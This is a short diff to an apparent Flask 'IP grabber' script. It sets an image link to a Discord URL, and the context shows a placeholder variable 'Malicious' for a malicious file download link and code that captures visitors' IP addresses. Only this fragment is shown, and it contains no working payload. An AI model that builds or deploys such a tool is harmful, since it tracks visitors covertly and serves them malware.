@@ -7,7 +7,7 @@ __name__,
 )
 @app.route('/', methods=['GET'])
 def main():
-  Image = 'YourImageLink' # Replace this with your image link
+  Image = 'https://discord.com/channels/767408500652769310/849179331561652234/968045368698863616' # Replace this with your image link
   Malicious = 'MaliciousFIleDownloadLink'# Replace this with your download link
   # This is to get the ip
   if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
